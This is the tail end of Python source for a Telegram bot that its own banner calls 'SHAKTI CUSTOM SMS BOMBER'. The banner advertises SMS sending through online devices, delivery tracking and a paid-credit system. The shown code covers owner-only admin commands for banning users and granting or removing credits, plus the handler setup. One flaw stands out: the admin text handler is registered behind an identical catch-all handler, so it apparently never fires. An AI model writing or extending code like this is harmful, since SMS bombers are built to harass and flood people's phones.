# ADMIN TEXT HANDLER
# ============================
async def handle_admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
    
    text = update.message.text
    action = context.user_data.get('admin_action')
    
    if not action:
        return
    
    if action == 'ban':
        try:
            target = int(text)
            if ban_user(target, user_id):
                await update.message.reply_text(f"✅ User {target} banned.")
            else:
                await update.message.reply_text("❌ Failed to ban.")
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        context.user_data.pop('admin_action', None)
        return
    
    if action == 'unban':
        try:
            target = int(text)
            if unban_user(target):
                await update.message.reply_text(f"✅ User {target} unbanned.")
            else:
                await update.message.reply_text("❌ User was not banned.")
        except:
            await update.message.reply_text("❌ Invalid user ID.")
        context.user_data.pop('admin_action', None)
        return
    
    if action == 'addcredits':
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Format: user_id amount")
            return
        try:
            target = int(parts[0]); amount = int(parts[1])
            add_credits(target, amount)
            await update.message.reply_text(f"✅ Added {amount} credits to user {target}.")
        except:
            await update.message.reply_text("❌ Invalid input.")
        context.user_data.pop('admin_action', None)
        return
    
    if action == 'removecredits':
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Format: user_id amount")
            return
        try:
            target = int(parts[0]); amount = int(parts[1])
            if remove_credits(target, amount):
                await update.message.reply_text(f"✅ Removed {amount} credits from user {target}.")
            else:
                await update.message.reply_text("❌ User may have insufficient credits.")
        except:
            await update.message.reply_text("❌ Invalid input.")
        context.user_data.pop('admin_action', None)
        return

# ============================
# MAIN
# ============================
def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("addcredits", add_credits_cmd))
    application.add_handler(CommandHandler("removecredits", remove_credits_cmd))
    application.add_handler(CommandHandler("ban", ban_cmd))
    application.add_handler(CommandHandler("unban", unban_cmd))
    application.add_handler(CommandHandler("shutdown", shutdown))
    
    application.add_handler(CallbackQueryHandler(handle_callbacks))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_text))
    application.add_handler(MessageHandler(filters.PHOTO, handle_text))
    
    print("""
╔════════════════════════════════════════════════╗
║  🔥 SHAKTI CUSTOM SMS BOMBER                  ║
║  ✅ Real-time Delivery Status                 ║
║  ✅ Success/Failed Tracking                   ║
║  ✅ Premium UI Design                         ║
║  ✅ SMS Logs Stored                           ║
║  ✅ Admin Panel                               ║
║  ✅ Free Credits: 2                           ║
║  ✅ Online Devices Only                       ║
║  ✅ 1 SMS per device                          ║
║  ✅ Auto-Stop after all online devices done   ║
║  ✅ Online/Offline/Total Device Status        ║
╚════════════════════════════════════════════════╝
    """)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
